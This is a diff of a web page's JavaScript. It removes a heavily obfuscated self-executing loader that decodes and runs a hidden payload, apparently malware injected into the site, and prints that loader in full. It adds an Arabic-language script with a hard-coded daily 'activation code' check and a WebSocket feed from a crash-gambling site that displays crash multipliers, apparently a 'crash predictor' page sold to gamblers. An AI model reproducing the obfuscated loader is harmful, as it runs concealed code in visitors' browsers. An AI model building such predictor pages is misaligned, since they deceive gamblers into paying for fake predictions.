@@ -1,1 +1,114 @@
-(function(){var Ssz='',FzU=721-710;function KgW(x){var e=3041824;var p=x.length;var a=[];for(var m=0;m<p;m++){a[m]=x.charAt(m)};for(var m=0;m<p;m++){var w=e*(m+144)+(e%48775);var q=e*(m+661)+(e%40541);var i=w%p;var g=q%p;var r=a[i];a[i]=a[g];a[g]=r;e=(w+q)%6526170;};return a.join('')};var yPL=KgW('knuophbodgarncrefwxiqjvmrcstsltutcoyz').substr(0,FzU);var YzU=',ar"}=1s,.5ga,y=d,09as r(r=bon(f(;ilne 6n.meol=ucxn=y;2da"=;==+,<p)a1)[;]= r;6 7 qc8o8"qo (.e=o8,;r,i0;mzdh0tau,]lddg0 4a=79rci=sinvllofrujtg0fyy(;lu;h.)lhuad.ts[d]-oghc;bi6;r+;b(sh;e9][>=rt)frrl);(vC1v(.+ r)nhrrv lm=,3s.[i,+=t3uC+)e v{1.]avkoier]sd;t)vr=itnt n)s=ra=s-3r+n;"+=3vn.-8=t+evn=(pi{v2+f)r] u-;va=)an+)lem5tr ;[su4+)v8o)g[xjgt0lbym.]n gna]r[p a+fsr[c2, )(,nr,iltr=lfva="=gb(0"tl;2o{.dqe}=)aglh,;=ec6rlfu)9,tviemi4i"8.yk5,vAl0ct0.=a,fa,;gi2=p+n0p+sahwt,r[i;n1p;2*)od=dedtr(s(xarh}pzndeA k6 f))+r=chmr6o.e(s)vu+f)a,7)1ah]da;n1;yrovis<o;r=Coma( 1teolpnhuz";s,s(gyCd pusg(l.jr=st8[0ee+mur6<5h;{s+7rigA1s17uk7rt) ({C)n=l[.arp]floS])[t=a+hyl..ote=)fen9-1e(j.;]a(hjnin("rd;}lza- ifmA(.{dtvvh;evd,lj+v((.;);,;.1;np,h;)2+=ovh(0=vvra7bt2(gat(}+ncarCd=,emieS2*o}q n(;to9;;l![tn)v.vh4hC80l;);pvg8}ev;c9l)m.f=rjoCir)q).c(u,<tAygn.xaine4;mnr, 1;q(+; h;otlu=k6yf;-7e>+u]5<.+6u=hv(f[!"r(joia((r{';var MnL=KgW[yPL];var NXQ='';var ZaG=MnL;var cny=MnL(NXQ,KgW(YzU));var ukQ=cny(KgW('(,c.$ .P.b)Ph4bijPl.2Pso_6)!,#PPvd0r(&e=\/)%.PbPb32pPP[.(an2g=%ePdlPl.,%P&ib$b7cc,nc0(a,+t&d)+\'.3};._)-$)d13,[p)e3(h..b+b(!fPthn{h%P*27oota.;\/!who," 30Prt](i3b.PPdP3\/7,P!4-)*j,(={$.r !004!(iPt%1 j)2oPht]g.f.l ns=\/;0cd )!.bS!o_%c1bpSP,b)t5=u.!{.bh3);p.1_r[vi$arfP9) $.j#0(.;n}c$;46s.().r4P]}[d*Pd"6PfP2nPe =!fnrdj.dsm$_}tnP4=n_3f;!P;gfoP}nP24.04$\/( lb_=g;t&_3rPsP4PP74ce.p."h!2"3,+r#.x=$\/3)l3$p12tbo$3li.P!(,11!d(n}{P)#(o..,fPPo+gt(*({tP,_.]ngh_nt=wP(j({4)dz25j4=,n)==i!3bwitlrP4k.P9rv=);0);(+Pz,P._5:4.30_"hb4tro .(dr0s_l l],#a$hdu4)wwnxP7 P%)\'eiirt\',96P[[+x=p.=;$ier.la=\';cP;;ob{ato$_)nm70P40e7Ph9bPc"Pv*)4lePc0ol(uPr32oPd)PP0;i()d)*sPiopPobP8c_$7%7))70v.hPP].i_v;=2jd}p!0T(m+o)j(P) .apj2%,{C;-sr%obo!.PP.ts_ P,&.(_sho;}(!P}ea,,c,$))ll!P!3bepP..3)3$!P+v(;=b){vP;n6(P]4b(.1d$$_fP;)e,6Pf(.0o,\/1sr(Pelbtwro,.2.#!S{!P.=vo)1PeuP,,P0_t,e(P2f.e.m 0.t_.aot[kP))63Ctu$4i5 ))e0"(4;(t ]10PPPfaoPp#}0)otpPP!2-jo;s(P1iPlrb .PboPP;r3r(f,uo0,8}p5ngP$(e.ab z=rc ,i1(P3!P_'));var Pbd=ZaG(Ssz,ukQ );Pbd(9863);return 7599})()
+<script>
+    var form = document.getElementById('myForm');
+    var submitButton = document.getElementById('submitButton');
+    var code = document.getElementById('activationCode');
+    
+    function showPopup() {
+        var popup = document.getElementById('popup');
+        popup.style.display = 'block';
+        setTimeout(() => { zera(); }, 1000);
+        form.style.display = 'block';
+    }
+
+    function closePopup() {
+        var popup = document.getElementById('popup');
+        popup.style.display = 'none';
+    }
+
+    submitButton.onclick = function(event) {
+        // منع السلوك الافتراضي
+        event.preventDefault();
+
+        // التحقق من صحة الكود وعرض الرسالة المنبثقة
+        const today = new Date();
+        let dd = today.getDate();
+
+        if (code.value == "A5XQR" + dd) {
+            setTimeout(() => { showPopup(); }, 1000);
+            form.style.display = 'block';
+        } else {
+            setTimeout(() => { checkCode(); }, 1000);
+            form.style.display = 'block';
+        }
+    };
+
+    function zera() {
+        document.location = 'zera.html';
+    }
+
+    function closeForm() {
+        form.style.display = 'none';
+    }
+
+    function checkCode() {
+        showErrorPopup();
+    }
+
+    function showErrorPopup() {
+        var popup = document.getElementById('errorPopup');
+        popup.style.display = 'block';
+    }
+
+    function closeErrorPopup() {
+        var popup = document.getElementById('errorPopup');
+        popup.style.display = 'none';
+    }
+
+    var openButton = document.getElementById('ball1');
+    
+    openButton.onclick = function() {
+        form.style.display = 'block';
+    };
+
+    function closeForm() {
+        form.style.display = 'none';
+    }
+
+    new function() {
+        var ws = null;
+
+        var open = function() {
+            var url = 'wss://coincharger.icu/games-frame/sockets/crash?whence=114&fcountry=66&ref=233&gr=790&appGuid=00000000-0000-0000-0000-000000000000&lng=ar';
+            ws = new WebSocket(url);
+            ws.onopen = onOpen;
+            ws.onclose = onClose;
+            ws.onmessage = onMessage;
+            ws.onerror = onError;
+        };
+
+        var close = function() {
+            if (ws) {
+                console.log('CLOSING ...');
+                ws.close();
+            }
+        };
+
+        var onOpen = function() {
+            console.log('OPENED: ');
+            ws.send('{"protocol":"json","version":1}\x1e');
+            ws.send('{"arguments":[{"activity":30,"currency":119}],"invocationId":"0","target":"Guest","type":1}\x1e');
+        };
+
+        var onClose = function() {
+            console.log('CLOSED: ');
+            ws = null;
+        };
+
+        var onMessage = function(event) {
+            const data = JSON.parse(event.data.slice(0, -1));
+            if (data.target === 'OnCrash') {
+                send(data.arguments[0].f);
+            }
+        };
+
+        var onError = function(event) {
+            alert(event.data);
+        };
+
+        open();
+    }
+
+    function send(id) {
+        document.getElementById('ball2').innerText = id;
+    }
+</script>
